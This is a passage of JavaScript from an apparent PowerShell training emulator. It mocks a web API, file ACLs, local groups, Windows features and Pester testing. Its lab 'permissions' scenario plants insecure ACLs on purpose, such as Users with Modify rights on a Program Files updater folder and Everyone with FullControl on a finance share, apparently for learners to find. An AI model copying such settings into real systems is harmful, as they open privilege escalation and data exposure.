  function server(name, env, os, patched, vulns, owner) { return { name: name, env: env, os: os, lastPatched: patched, criticalVulns: vulns, owner: owner }; }
  lib.systemHooks.push(function (sys) {
    sys.api = {
      servers: [
        server("web-01", "prod", "Windows Server 2022", "2026-11-02", 0, "maya.chen"), server("web-02", "prod", "Windows Server 2022", "2026-08-14", 2, "maya.chen"),
        server("db-01", "prod", "Windows Server 2019", "2026-09-30", 1, "dana.park"), server("db-02", "prod", "Windows Server 2022", "2026-11-01", 0, "dana.park"),
        server("app-01", "prod", "Ubuntu 24.04", "2026-11-05", 0, "ben.okoro"), server("app-02", "prod", "Ubuntu 22.04", "2026-06-21", 3, "ben.okoro"),
        server("cache-01", "prod", "Ubuntu 24.04", "2026-10-28", 0, "maya.chen"), server("kc-win-01", "prod", "Windows Server 2022", "2026-10-15", 0, "dana.park"),
        server("dev-web-01", "dev", "Windows Server 2022", "2026-05-03", 4, "ben.okoro"), server("dev-db-01", "dev", "Windows Server 2019", "2026-07-19", 1, "ben.okoro"),
        server("build-01", "dev", "Ubuntu 24.04", "2026-11-07", 0, "maya.chen"), server("test-app-01", "test", "Ubuntu 22.04", "2026-09-09", 2, "chris.lee")
      ],
      tickets: [], requests: [], nextTicket: 1042
    };
  });
  var STATUS_TEXT = { 200: "OK", 201: "Created", 204: "No Content", 400: "Bad Request", 401: "Unauthorized", 403: "Forbidden", 404: "Not Found", 405: "Method Not Allowed", 415: "Unsupported Media Type", 429: "Too Many Requests", 500: "Internal Server Error" };
  function apiHandle(sys, req) {
    var api = sys.api, u = req.url;
    api.requests.push({ method: req.method, path: u.path + u.search, auth: req.auth, contentType: req.contentType, body: req.body });
    function json(status, data, headers) { return { status: status, body: JSON.stringify(data), headers: Object.assign({ "Content-Type": "application/json; charset=utf-8" }, headers || {}) }; }
    var path = u.path.replace(/\/+$/, "");
    if (path === "/v1/status" && req.method === "GET") return json(200, { service: "kestrel-inventory", status: "ok", version: "2.3.1" });
    if (!/^\/v1\//.test(path)) return json(404, { error: "not_found", message: "No such endpoint: " + u.path });
    if (req.auth !== "Bearer " + API_TOKEN) return json(401, { error: "invalid_token", message: "Missing or invalid bearer token. Send the header Authorization: Bearer <token>." }, { "WWW-Authenticate": "Bearer" });
    var q = {};
    u.search.replace(/^\?/, "").split("&").filter(Boolean).forEach(function (kv) { var i = kv.indexOf("="); q[decodeURIComponent(kv.slice(0, i < 0 ? kv.length : i))] = i < 0 ? "" : decodeURIComponent(kv.slice(i + 1)); });
    if (path === "/v1/servers" && req.method === "GET") {
      var all = api.servers.filter(function (s) { return !q.env || s.env === q.env; });
      var per = 5, page = Math.max(1, parseInt(q.page || "1", 10) || 1), pages = Math.max(1, Math.ceil(all.length / per));
      var items = all.slice((page - 1) * per, page * per);
      var base = "https://api.kestrel.io/v1/servers?" + (q.env ? "env=" + q.env + "&" : "") + "page=";
      return json(200, { items: items, page: page, pages: pages, total: all.length, next: page < pages ? base + (page + 1) : null });
    }
    var m = /^\/v1\/servers\/([^\/]+)$/.exec(path);
    if (m && req.method === "GET") {
      var s = api.servers.filter(function (x) { return x.name === decodeURIComponent(m[1]); })[0];
      return s ? json(200, s) : json(404, { error: "not_found", message: "No server called " + decodeURIComponent(m[1]) });
    }
    if (path === "/v1/tickets" && req.method === "GET") return json(200, api.tickets);
    if (path === "/v1/tickets" && req.method === "POST") {
      if (!/json/i.test(req.contentType || "")) return json(415, { error: "unsupported_media_type", message: "Send JSON: -Body ($data | ConvertTo-Json) -ContentType 'application/json'" });
      var data;
      try { data = JSON.parse(req.body || ""); } catch (e) { return json(400, { error: "bad_json", message: "The body is not valid JSON." }); }
      if (!data || typeof data !== "object" || Array.isArray(data)) return json(400, { error: "validation", message: "Send one JSON object." });
      if (!data.title) return json(400, { error: "validation", message: "title is required" });
      if (["low", "medium", "high"].indexOf(data.priority) < 0) return json(400, { error: "validation", message: "priority must be low, medium or high" });
      if (data.server && !api.servers.some(function (x) { return x.name === data.server; })) return json(400, { error: "validation", message: "Unknown server: " + data.server });
      var t = { id: "TCK-" + (api.nextTicket++), title: data.title, server: data.server || null, priority: data.priority, status: "open", createdBy: "dev" };
      api.tickets.push(t);
      return json(201, t, { Location: "https://api.kestrel.io/v1/tickets/" + t.id });
    }
    if (/^\/v1\/(servers|tickets)/.test(path)) return json(405, { error: "method_not_allowed", message: req.method + " is not allowed on " + u.path });
    return json(404, { error: "not_found", message: "No such endpoint: " + u.path });
  }
  lib.apiHandle = apiHandle;
  function parseUrl(s) {
    var m = /^(https?):\/\/([^\/?#:]+)(?::(\d+))?([^?#]*)(\?[^#]*)?/i.exec(s);
    if (!m) return null;
    return { scheme: lc(m[1]), host: lc(m[2]), port: m[3] || null, path: m[4] || "/", search: m[5] || "" };
  }
  function bodyText(body, ctx) {
    if (body === undefined || body === null) return { text: null, form: false };
    if (body instanceof PSHashtable) return { text: body.entries().map(function (e) { return encodeURIComponent(toStr(e.key)) + "=" + encodeURIComponent(toStr(e.value)); }).join("&"), form: true };
    return { text: toStr(body), form: false };
  }
  function webRequest(b, ctx, cmdName) {
    var session = ctx.session, sys = session.system;
    var uri = toStr(b.uri);
    var u = parseUrl(uri);
    if (!u) throw err("Invalid URI: The format of the URI could not be determined.", "InvalidArgument");
    var method = b.method !== undefined ? toStr(b.method).toUpperCase() : "GET";
    var headers = {};
    if (b.headers instanceof PSHashtable) b.headers.entries().forEach(function (e) { headers[lc(toStr(e.key))] = toStr(e.value); });
    var auth = headers.authorization || null;
    if (b.authentication !== undefined) {
      var kind = lc(toStr(b.authentication));
      if (kind === "bearer" || kind === "oauth") {
        if (!isSecure(b.token)) throw err("The -Token parameter must be a SecureString (ConvertTo-SecureString or Get-Secret).");
        if (u.scheme !== "https" && !b.allowunencryptedauthentication) throw err("The cmdlet cannot protect plain text secrets sent over unencrypted connections. To suppress this warning and send plain text secrets over unencrypted networks, reissue the command specifying the AllowUnencryptedAuthentication parameter.", "InvalidOperation", { errorId: "WebCmdletAllowUnencryptedAuthenticationRequiredException" });
        auth = "Bearer " + b.token.secret;
      }
    }
    var bt = bodyText(b.body, ctx);
    var contentType = b.contenttype !== undefined ? toStr(b.contenttype) : headers["content-type"] || (bt.form ? "application/x-www-form-urlencoded" : bt.text !== null ? "text/plain" : null);
    if (u.host !== "api.kestrel.io") throw err("No such host is known. (" + u.host + ":" + (u.port || (u.scheme === "https" ? 443 : 80)) + ")", "ConnectionError", { errorId: "System.Net.Http.HttpRequestException" });
    if (u.scheme !== "https") throw err("No connection could be made because the target machine actively refused it. (" + u.host + ":80) The Kestrel API only listens on HTTPS.", "ConnectionError");
    var res = apiHandle(sys, { method: method, url: u, auth: auth, contentType: contentType, body: bt.text });
    if (b.statuscodevariable !== undefined) ctx.scope.setLocal(toStr(b.statuscodevariable), res.status);
    if (b.responseheadersvariable !== undefined) { var h = new PSHashtable(); Object.keys(res.headers).forEach(function (k) { h.set(k, [res.headers[k]]); }); ctx.scope.setLocal(toStr(b.responseheadersvariable), h); }
    if (res.status >= 400 && !b.skiphttperrorcheck) {
      var resp = obj("System.Net.Http.HttpResponseMessage", { StatusCode: res.status, ReasonPhrase: STATUS_TEXT[res.status] || "", IsSuccessStatusCode: false });
      resp.toStringFn = function () { return "StatusCode: " + res.status + ", ReasonPhrase: '" + (STATUS_TEXT[res.status] || "") + "'"; };
      throw err(res.body, "InvalidOperation", { errorId: "WebCmdletWebResponseException," + cmdName, exceptionType: "Microsoft.PowerShell.Commands.HttpResponseException",
        exceptionMessage: "Response status code does not indicate success: " + res.status + " (" + (STATUS_TEXT[res.status] || "") + ").", exceptionProps: { Response: resp }, details: res.body });
    }
    return res;
  }
  var WEB_PARAMS = [p("Uri", 0), p("Method"), p("Headers"), p("Body"), p("ContentType"), p("Authentication"), p("Token"), p("Credential"), sw("AllowUnencryptedAuthentication"), sw("SkipHttpErrorCheck"), p("StatusCodeVariable"),
    p("ResponseHeadersVariable"), sw("UseBasicParsing"), p("TimeoutSec"), p("OutFile"), sw("SkipCertificateCheck"), p("MaximumRetryCount"), p("RetryIntervalSec"), p("UserAgent")];
  C("Invoke-RestMethod", UTIL, WEB_PARAMS, function (b, input, ctx) {
    if (b.body === undefined && input && input.length) b.body = input[0];
    var res = webRequest(b, ctx, "Microsoft.PowerShell.Commands.InvokeRestMethodCommand");
    if (b.outfile !== undefined) { fs.write(ctx.session.system, toStr(b.outfile), res.body); return []; }
    if (!res.body) return [];
    var v = lib.cmdlets["convertfrom-json"].run({ inputobject: res.body }, null, ctx)[0];
    return Array.isArray(v) ? v : [v];
  }, { synopsis: "Calls a web API and turns the JSON reply into objects.", examples: ["Invoke-RestMethod https://api.kestrel.io/v1/status", "Invoke-RestMethod -Uri $url -Headers @{ Authorization = \"Bearer $env:KESTREL_API_TOKEN\" }"] });
  alias("irm", "Invoke-RestMethod");
  C("Invoke-WebRequest", UTIL, WEB_PARAMS, function (b, input, ctx) {
    var res = webRequest(b, ctx, "Microsoft.PowerShell.Commands.InvokeWebRequestCommand");
    if (b.outfile !== undefined) { fs.write(ctx.session.system, toStr(b.outfile), res.body); return []; }
    var h = new PSHashtable(); Object.keys(res.headers).forEach(function (k) { h.set(k, [res.headers[k]]); });
    var o = obj("Microsoft.PowerShell.Commands.WebResponseObject", { StatusCode: res.status, StatusDescription: STATUS_TEXT[res.status] || "", Content: res.body, RawContent: "HTTP/1.1 " + res.status + " " + (STATUS_TEXT[res.status] || "") + "\r\n\r\n" + res.body, Headers: h, RawContentLength: res.body.length });
    return [o];
  }, { synopsis: "Makes a web request and returns the raw response (StatusCode, Headers, Content)." });
  alias("iwr", "Invoke-WebRequest"); alias("curl", "Invoke-WebRequest"); alias("wget", "Invoke-WebRequest");
  lib.listTypes["Microsoft.PowerShell.Commands.WebResponseObject"] = true;

  /* ================================================================== File ACLs */
  var WELL_KNOWN = { "everyone": "Everyone", "users": "BUILTIN\\Users", "administrators": "BUILTIN\\Administrators", "authenticated users": "NT AUTHORITY\\Authenticated Users", "system": "NT AUTHORITY\\SYSTEM",
    "creator owner": "CREATOR OWNER", "trustedinstaller": "NT SERVICE\\TrustedInstaller" };
  function identity(s) {
    s = toStr(s).trim();
    var k = lc(s);
    if (WELL_KNOWN[k]) return WELL_KNOWN[k];
    if (/^builtin\\/i.test(s)) return "BUILTIN\\" + s.split("\\")[1].replace(/^(\w)/, function (c) { return c.toUpperCase(); });
    if (/^nt authority\\/i.test(s)) return "NT AUTHORITY\\" + s.split("\\")[1].toUpperCase().replace("AUTHENTICATED USERS", "Authenticated Users");
    if (s.indexOf("\\") < 0) return "KC-WIN-01\\" + s;
    return s;
  }
  function identityObj(id) { var o = obj("System.Security.Principal.NTAccount", { Value: id }); o.toStringFn = function () { return id; }; o.cmpAsString = true; return o; }
  var RIGHTS = ["FullControl", "Modify", "ReadAndExecute", "Read", "Write", "ListDirectory", "Synchronize", "Delete", "ChangePermissions", "TakeOwnership"];
  function normRights(r) {
    var parts = toStr(r).split(/\s*,\s*/).filter(Boolean).map(function (x) { var h = RIGHTS.filter(function (y) { return lc(y) === lc(x); })[0]; if (!h) throw err("Cannot convert value \"" + toStr(r) + "\" to type \"System.Security.AccessControl.FileSystemRights\". Use FullControl, Modify, ReadAndExecute, Read, Write..."); return h; });
    if (parts.indexOf("FullControl") >= 0) return "FullControl";
    if (parts.indexOf("Synchronize") < 0) parts.push("Synchronize");
    return parts.join(", ");
  }
  function ruleFromArgs(args) {
    // (identity, rights, type) or (identity, rights, inheritance, propagation, type)
    var id = identity(args[0] instanceof PSObject ? toStr(args[0].get("Value") || args[0]) : args[0]);
    var rights = normRights(args[1]);
    var type = toStr(args.length >= 5 ? args[4] : args[2] || "Allow");
    var inh = args.length >= 5 ? toStr(args[2]) : "None", prop = args.length >= 5 ? toStr(args[3]) : "None";
    if (!/^(allow|deny)$/i.test(type)) throw err("Cannot convert value \"" + type + "\" to type \"System.Security.AccessControl.AccessControlType\". Use Allow or Deny.");
    return ruleObj({ id: id, rights: rights, type: /^deny$/i.test(type) ? "Deny" : "Allow", inherited: false, inheritance: inh, propagation: prop });
  }
  function ruleObj(r) {
    var o = obj("System.Security.AccessControl.FileSystemAccessRule", { FileSystemRights: r.rights, AccessControlType: r.type, IdentityReference: identityObj(r.id), IsInherited: !!r.inherited, InheritanceFlags: r.inheritance || "ContainerInherit, ObjectInherit", PropagationFlags: r.propagation || "None" });
    o.rule = r;
    return o;
  }
  lib.views["System.Security.AccessControl.FileSystemAccessRule"] = [{ header: "IdentityReference", get: function (o) { return toStr(o.get("IdentityReference")); } }, "AccessControlType", "FileSystemRights", "IsInherited"];
  var DEFAULT_RULES = [
    { id: "NT AUTHORITY\\SYSTEM", rights: "FullControl", type: "Allow" },
    { id: "BUILTIN\\Administrators", rights: "FullControl", type: "Allow" },
    { id: "BUILTIN\\Users", rights: "ReadAndExecute, Synchronize", type: "Allow" }
  ];
  function aclKey(sys, path) { return lc(fs.normPath(sys, path).display).replace(/\\$/, ""); }
  function parentKey(k) { var i = k.lastIndexOf("\\"); return i > 2 ? k.slice(0, i) : null; }
  function effectiveAcl(sys, path) {
    sys.acls = sys.acls || {};
    var k = aclKey(sys, path), chain = [], cur = k;
    while (cur) { if (sys.acls[cur]) chain.push(sys.acls[cur]); if (sys.acls[cur] && sys.acls[cur].protected) break; cur = parentKey(cur); }
    var own = sys.acls[k];
    var rules = [];
    if (own) own.rules.forEach(function (r) { rules.push(Object.assign({}, r, { inherited: false })); });
    var stop = own && own.protected;
    if (!stop) {
      var inheritedFrom = chain.filter(function (a) { return a !== own; });
      var src = inheritedFrom.length ? inheritedFrom : [{ rules: /^c:\\users\\dev/.test(k) ? [{ id: "KC-WIN-01\\dev", rights: "FullControl", type: "Allow" }].concat(DEFAULT_RULES) : DEFAULT_RULES }];
      src.forEach(function (a) { a.rules.forEach(function (r) { if (!rules.some(function (x) { return lc(x.id) === lc(r.id) && x.rights === r.rights && x.type === r.type; })) rules.push(Object.assign({}, r, { inherited: true })); }); });
    }
    var owner = own && own.owner ? own.owner : (chain[0] && chain[0].owner) || (/^c:\\users\\dev/.test(k) ? "KC-WIN-01\\dev" : /^c:\\lab/.test(k) ? "KC-WIN-01\\dev" : "BUILTIN\\Administrators");
    return { key: k, owner: owner, rules: rules, protected: !!(own && own.protected) };
  }
  function aclObj(sys, path, isDir) {
    var a = effectiveAcl(sys, path);
    var display = fs.normPath(sys, path).display;
    var state = { rules: a.rules.map(function (r) { return Object.assign({}, r); }), protected: a.protected, owner: a.owner, path: display, key: a.key };
    var o = obj(isDir ? "System.Security.AccessControl.DirectorySecurity" : "System.Security.AccessControl.FileSecurity", {});
    function refresh() {
      o.set("Path", "Microsoft.PowerShell.Core\\FileSystem::" + display);
      o.set("Owner", state.owner);
      o.set("Group", "KC-WIN-01\\None");
      o.set("Access", state.rules.map(ruleObj));
      o.set("AccessToString", state.rules.map(function (r) { return r.id + " " + r.type + "  " + r.rights; }).join("\n"));
      o.set("AreAccessRulesProtected", state.protected);
    }
    refresh();
    o.aclState = state;
    function ruleArg(args, m) { var r = args[0] && args[0].rule; if (!r) throw err("Exception calling \"" + m + "\" with \"1\" argument(s): \"Value cannot be null. (Parameter 'rule')\"", "InvalidOperation"); return r; }
    function same(a, b) { return lc(a.id) === lc(b.id) && a.type === b.type && a.rights === b.rights; }
    o.methods = {
      addaccessrule: function (args) { var r = ruleArg(args, "AddAccessRule"); state.rules.push(Object.assign({}, r, { inherited: false })); refresh(); return undefined; },
      setaccessrule: function (args) { var r = ruleArg(args, "SetAccessRule"); state.rules = state.rules.filter(function (x) { return x.inherited || !(lc(x.id) === lc(r.id) && x.type === r.type); }); state.rules.push(Object.assign({}, r, { inherited: false })); refresh(); return undefined; },
      removeaccessrule: function (args) {
        var r = ruleArg(args, "RemoveAccessRule"), before = state.rules.length;
        // Inherited rules can't be removed directly: protect the ACL first (SetAccessRuleProtection).
        state.rules = state.rules.filter(function (x) { return x.inherited || !same(x, r); });
        refresh(); return state.rules.length !== before;
      },
      removeaccessruleall: function (args) { var r = ruleArg(args, "RemoveAccessRuleAll"); state.rules = state.rules.filter(function (x) { return x.inherited || !(lc(x.id) === lc(r.id) && x.type === r.type); }); refresh(); return undefined; },
      purgeaccessrules: function (args) { var id = identity(args[0] instanceof PSObject ? toStr(args[0].get("Value")) : args[0]); state.rules = state.rules.filter(function (x) { return x.inherited || lc(x.id) !== lc(id); }); refresh(); return undefined; },
      setaccessruleprotection: function (args) {
        var isProt = toBool(args[0]), keep = toBool(args[1]);
        if (isProt) { state.protected = true; state.rules = state.rules.filter(function (x) { return !x.inherited || keep; }).map(function (x) { return Object.assign({}, x, { inherited: false }); }); }
        else state.protected = false;
        refresh(); return undefined;
      },
      setowner: function (args) { state.owner = identity(args[0] instanceof PSObject ? toStr(args[0].get("Value")) : args[0]); refresh(); return undefined; },
      getaccessrules: function () { return state.rules.map(ruleObj); }
    };
    return o;
  }
  lib.views["System.Security.AccessControl.DirectorySecurity"] = lib.views["System.Security.AccessControl.FileSecurity"] = [
    { header: "Path", get: function (o) { return toStr(o.get("Path")).replace(/^.*::/, "").split("\\").pop(); } }, "Owner",
    { header: "Access", get: function (o) { return toStr(o.get("AccessToString")).split("\n").join("; "); } }];
  lib.effectiveAcl = effectiveAcl;
  function exists(sys, path) { return !!fs.get(sys, path) || fs.isDir(sys, path); }
  C("Get-Acl", SEC, [p("Path", 0)], function (b, input, ctx) {
    var sys = ctx.session.system, out = [];
    var paths = input && input.length ? input.map(function (x) { return toStr(x instanceof PSObject && x.has("FullName") ? x.get("FullName") : x); }) : names(b.path !== undefined ? b.path : ".");
    paths.forEach(function (pth) {
      if (!exists(sys, pth)) { fs.notFound(ctx, pth); return; }
      out.push(aclObj(sys, pth, !fs.get(sys, pth)));
    });
    return out;
  }, { synopsis: "Gets a file or folder's permissions (owner and access rules)." });
  C("Set-Acl", SEC, [p("Path", 0), p("AclObject", 1)], function (b, input, ctx) {
    var sys = ctx.session.system;
    var acl = b.aclobject !== undefined ? b.aclobject : (input || [])[0];
    if (!acl || !acl.aclState) throw err("Cannot bind parameter 'AclObject': pass the object you got from Get-Acl.");
    names(b.path !== undefined ? b.path : acl.aclState.path).forEach(function (pth) {
      if (!exists(sys, pth)) { fs.notFound(ctx, pth); return; }
      var k = aclKey(sys, pth);
      if (/^c:\\(program files|windows)/.test(k) && !ctx.session.elevated) throw err("Attempted to perform an unauthorized operation.", "PermissionDenied", { errorId: "System.UnauthorizedAccessException" });
      if (ctx.whatIf) { ctx.session.write("What if: Performing the operation \"Set-Acl\" on target \"" + fs.normPath(sys, pth).display + "\".", "whatif"); return; }
      sys.acls = sys.acls || {};
      sys.acls[k] = { owner: acl.aclState.owner, protected: acl.aclState.protected, rules: acl.aclState.rules.filter(function (r) { return !r.inherited; }).map(function (r) { return { id: r.id, rights: r.rights, type: r.type }; }) };
      sys.actions.push("Set-Acl " + fs.normPath(sys, pth).display);
    });
    return [];
  }, { synopsis: "Writes permissions back to a file or folder (after you change the object from Get-Acl)." });

  /* ---------------- Local groups */
  function groupKey(sys, g) { var k = Object.keys(sys.groups).filter(function (x) { return lc(x) === lc(toStr(g)); })[0]; if (!k) throw err("Group " + toStr(g) + " was not found.", "ObjectNotFound"); return k; }
  function memberName(m) { var s = m instanceof PSObject ? toStr(m.get("Name")) : toStr(m); return s.replace(/^(kc-win-01|\.)\\/i, ""); }
  ["Add", "Remove"].forEach(function (verb) {
    C(verb + "-LocalGroupMember", LOCAL, [p("Group", 0, { aliases: ["Name"] }), p("Member", 1)], function (b, input, ctx) {
      var sys = ctx.session.system;
      if (!ctx.session.elevated) throw err("Access denied.", "PermissionDenied", { errorId: "AccessDenied" });
      var g = groupKey(sys, b.group);
      var members = input && input.length ? input : list(b.member);
      members.forEach(function (m) {
        var nm = memberName(m), has = sys.groups[g].some(function (x) { return lc(x) === lc(nm); });
        if (ctx.whatIf) { ctx.session.write("What if: Performing the operation \"" + verb + " member\" on target \"" + g + "\".", "whatif"); return; }
        if (verb === "Add") {
          if (has) { E.writeCmdletError(ctx, "KC-WIN-01\\" + nm + " is already a member of group " + g + ".", "ResourceExists", nm); return; }
          if (!sys.users.some(function (u) { return lc(u.Name) === lc(nm); }) && nm.indexOf("\\") < 0) { E.writeCmdletError(ctx, "Principal " + nm + " was not found.", "ObjectNotFound", nm); return; }
          sys.groups[g].push(nm);
        } else {
          if (!has) { E.writeCmdletError(ctx, "Member KC-WIN-01\\" + nm + " was not found in group " + g + ".", "ObjectNotFound", nm); return; }
          sys.groups[g] = sys.groups[g].filter(function (x) { return lc(x) !== lc(nm); });
        }
        sys.actions.push(verb + "-LocalGroupMember " + g + " " + nm);
      });
      return [];
    }, { synopsis: verb + "s members " + (verb === "Add" ? "to" : "from") + " a local group (needs an elevated session)." });
  });

  /* ---------------- Windows optional features */
  var FEATURE_NAMES = { MicrosoftWindowsPowerShellV2Root: "Windows PowerShell 2.0", MicrosoftWindowsPowerShellV2: "Windows PowerShell 2.0 Engine", SMB1Protocol: "SMB 1.0/CIFS File Sharing Support" };
  function needElevation(ctx) { if (!ctx.session.elevated) throw err("The requested operation requires elevation.", "PermissionDenied", { errorId: "Microsoft.Dism.Commands.GetWindowsOptionalFeatureCommand" }); }
  C("Get-WindowsOptionalFeature", DISM, [sw("Online"), p("FeatureName")], function (b, input, ctx) {
    needElevation(ctx);
    var sys = ctx.session.system;
    return Object.keys(sys.features).filter(function (k) { return b.featurename === undefined || names(b.featurename).some(function (n) { return E.wildcardRe(n).test(k); }); })
      .map(function (k) { return obj("Microsoft.Dism.Commands.AdvancedFeatureObject", { FeatureName: k, DisplayName: FEATURE_NAMES[k] || k, State: sys.features[k], RestartRequired: "Possible" }); });
  }, { synopsis: "Lists optional Windows features and whether they're Enabled (run elevated)." });
  lib.views["Microsoft.Dism.Commands.AdvancedFeatureObject"] = ["FeatureName", "State"];
  ["Enable", "Disable"].forEach(function (verb) {
    C(verb + "-WindowsOptionalFeature", DISM, [sw("Online"), p("FeatureName"), sw("NoRestart"), sw("All")], function (b, input, ctx) {
      needElevation(ctx);
      var sys = ctx.session.system;
      names(b.featurename).forEach(function (n) {
        var k = Object.keys(sys.features).filter(function (x) { return lc(x) === lc(n); })[0];
        if (!k) throw err("Feature name " + n + " is unknown.", "ObjectNotFound");
        sys.features[k] = verb === "Enable" ? "Enabled" : "Disabled";
        if (k === "MicrosoftWindowsPowerShellV2Root" && verb === "Disable") sys.features.MicrosoftWindowsPowerShellV2 = "Disabled";
        sys.actions.push(verb + "-WindowsOptionalFeature " + k);
      });
      return [obj("Microsoft.Dism.Commands.ImageObject", { Path: "", Online: true, RestartNeeded: false })];
    }, { synopsis: verb + "s an optional Windows feature (run elevated)." });
  });

  /* ---------------- Per-session aliases: Set-Alias / New-Alias */
  ["Set", "New"].forEach(function (verb) {
    C(verb + "-Alias", UTIL, [p("Name", 0), p("Value", 1), p("Description"), p("Scope"), sw("Force"), sw("PassThru")], function (b, input, ctx) {
      var s = ctx.session;
      s.aliases = s.aliases || {};
      var k = lc(toStr(b.name));
      if (verb === "New" && (s.aliases[k] || lib.aliases[k]) && !b.force) throw err("The alias is not allowed, because an alias with the name '" + toStr(b.name) + "' already exists.", "ResourceExists");
      s.aliases[k] = toStr(b.value);
      return [];
    }, { synopsis: verb === "Set" ? "Creates or changes an alias: Set-Alias dr Get-DiskReport." : "Creates a new alias." });
  });

  /* ================================================================== Lab scenarios added in Module 4 */
  (function () {
    var c = lib.cmdlets["initialize-labscenario"], prev = c.run;
    c.run = function (b, input, ctx) {
      var sys = ctx.session.system;
      names(b.name).forEach(function (n) {
        var k = lc(n);
        if (k === "admin") { ctx.session.elevated = true; return; }
        if (k === "permissions") { permissionsScenario(sys); return; }
        if (k === "api") { ctx.session.env.KESTREL_API_TOKEN = API_TOKEN; return; }
        if (k === "ci") {
          // What a GitHub Actions runner sets for a step.
          var env = ctx.session.env;
          env.CI = "true"; env.GITHUB_ACTIONS = "true"; env.GITHUB_WORKSPACE = "C:\\lab"; env.GITHUB_STEP_SUMMARY = "C:\\lab\\step-summary.md";
          env.GITHUB_REPOSITORY = "kestrel-cloud/kc-tools"; env.GITHUB_SHA = "4f2a9c1d7e3b8a6f0c5d2e1b9a8f7c6d5e4b3a21"; env.RUNNER_OS = "Windows";
          return;
        }
        prev({ name: n }, input, ctx);
        if (k === "incident") incidentExtras(sys);
      });
      return [];
    };
  })();
  function permissionsScenario(sys) {
    sys.acls = sys.acls || {};
    ["C:\\Program Files\\Kestrel\\kestrel-agent.exe", "C:\\Program Files\\Kestrel\\Updater\\kupdate.exe", "C:\\Program Files\\Kestrel\\Agent\\config.json",
      "C:\\lab\\shares\\finance\\budget-2027.xlsx", "C:\\lab\\shares\\public\\readme.txt", "C:\\lab\\scripts\\Get-DiskReport.ps1"].forEach(function (f) { if (!fs.get(sys, f)) fs.write(sys, f, "(binary)\n"); });
    sys.acls["c:\\program files\\kestrel"] = { owner: "NT AUTHORITY\\SYSTEM", protected: true, rules: DEFAULT_RULES.map(function (r) { return Object.assign({}, r); }) };
    sys.acls["c:\\program files\\kestrel\\updater"] = { rules: [{ id: "BUILTIN\\Users", rights: "Modify, Synchronize", type: "Allow" }] };
    sys.acls["c:\\program files\\kestrel\\agent"] = { rules: [{ id: "KC-WIN-01\\svc-backup", rights: "ReadAndExecute, Synchronize", type: "Allow" }] };
    sys.acls["c:\\lab\\shares\\finance"] = { owner: "KC-WIN-01\\ed.moss", rules: [{ id: "Everyone", rights: "FullControl", type: "Allow" }] };
    sys.acls["c:\\lab\\shares\\public"] = { rules: [{ id: "NT AUTHORITY\\Authenticated Users", rights: "Read, Synchronize", type: "Allow" }] };
    sys.acls["c:\\lab\\scripts"] = { rules: [{ id: "NT AUTHORITY\\Authenticated Users", rights: "Write, Synchronize", type: "Allow" }] };
  }
  lib.permissionsScenario = permissionsScenario;

  /* ================================================================== Pester (a small, faithful subset of Pester 5) */
  var PESTER = "Pester";
  function pst(session) { return session.pester || (session.pester = { stack: [], discovering: null, current: null, calls: [], invoke: null }); }
  function fmt(v) {
    if (v === null || v === undefined) return "$null";
    if (v === true) return "$true";
    if (v === false) return "$false";
    if (typeof v === "number") return String(v);
    if (typeof v === "string") return "'" + v + "'";
    if (Array.isArray(v)) return "@(" + v.map(fmt).join(", ") + ")";
    if (v instanceof ScriptBlock) return "{" + v.text.trim() + "}";
    return "'" + toStr(v) + "'";
  }
  function pctx(session, scope, extra) { var c = new E.Ctx(session, scope); if (extra) for (var k in extra) c[k] = extra[k]; return c; }
  function needPester(ctx, name) { lib.requireModule(ctx, "pester", name); }
  function block(ctx, kind, name, sb, skip) {
    needPester(ctx, kind);
    var session = ctx.session, st = pst(session);
    if (!(sb instanceof ScriptBlock)) throw err(kind + " needs a name and a script block: " + kind + " 'name' { ... }");
    var node = { kind: kind, name: name, sb: sb, children: [], beforeAll: [], beforeEach: [], afterEach: [], afterAll: [], skip: !!skip, parent: st.discovering, mocks: [] };
    if (st.current) throw err(kind + " can't be used inside It or BeforeAll: put it directly in a Describe or Context.", "InvalidOperation");
    if (st.discovering) { st.discovering.children.push(node); discover(session, node, st.discoverScope); return []; }
    // A root Describe: discover everything inside it, then run it (or queue it for Invoke-Pester).
    node.scope = ctx.scope;
    discover(session, node, ctx.scope);
    if (st.invoke) { st.invoke.roots.push(node); return []; }
    var res = newResults();
    runNode(session, node, ctx.scope, res, 0);
    summary(session, res, false);
    return [];
  }
  function discover(session, node, parentScope) {
    var st = pst(session), prev = st.discovering, prevScope = st.discoverScope;
    var scope = new E.Scope(parentScope);
    node.dscope = scope;
    st.discovering = node; st.discoverScope = scope;
    try { E.execBlock(node.sb.block, pctx(session, scope), []); }
    finally { st.discovering = prev; st.discoverScope = prevScope; }
  }
  function newResults() { return { passed: 0, failed: 0, skipped: 0, tests: [], ms: 0 }; }
  function countTests(node) { return node.children.reduce(function (a, c) { return a + (c.kind === "It" ? c.cases.length : countTests(c)); }, 0); }
  function say(session, text, cls) { var st = pst(session); if (st.invoke && st.invoke.output === "none") return; session.write(text, cls || ""); }
  function runNode(session, node, parentScope, res, depth) {
    var scope = new E.Scope(parentScope), st = pst(session);
    var pad = new Array(depth + 1).join(" ");
    say(session, pad + (node.kind === "Describe" ? "Describing " : "Context ") + node.name, "c-green");
    var setupError = null;
    var prevCur = st.current;
    st.current = node;
    try { node.beforeAll.forEach(function (sb) { E.execBlock(sb.block, pctx(session, scope), []); }); }
    catch (e) { if (e instanceof E.PSError) setupError = e; else throw e; }
    finally { st.current = prevCur; }
    node.children.forEach(function (ch) {
      if (ch.kind === "It") ch.cases.forEach(function (tc) { runIt(session, node, ch, tc, scope, res, depth + 1, setupError); });
      else runNode(session, ch, scope, res, depth + 1);
    });
    try { st.current = node; node.afterAll.forEach(function (sb) { E.execBlock(sb.block, pctx(session, scope), []); }); }
    catch (e) { if (!(e instanceof E.PSError)) throw e; }
    finally { st.current = prevCur; }
    clearMocks(session, node);
  }
  function chain(node) { var out = []; for (var n = node; n; n = n.parent) out.unshift(n); return out; }
  function runIt(session, node, it, tc, scope, res, depth, setupError) {
    var st = pst(session), pad = new Array(depth + 1).join(" ");
    var name = it.name.replace(/<(\w+)>/g, function (m0, k) { return tc && tc.has(k) ? toStr(tc.get(k)) : m0; });
    var path = chain(node).map(function (n) { return n.name; }).concat([name]).join(".");
    var ms = 2 + (res.tests.length * 7) % 9;
    if (it.skip || node.skip) { res.skipped++; res.tests.push({ name: name, path: path, result: "Skipped" }); say(session, pad + "[!] " + name + " is skipped", "c-yellow"); return; }
    var itScope = new E.Scope(scope);
    if (tc) tc.entries().forEach(function (e) { itScope.setLocal(toStr(e.key), e.value); itScope.setLocal("_", tc); });
    var prevCur = st.current;
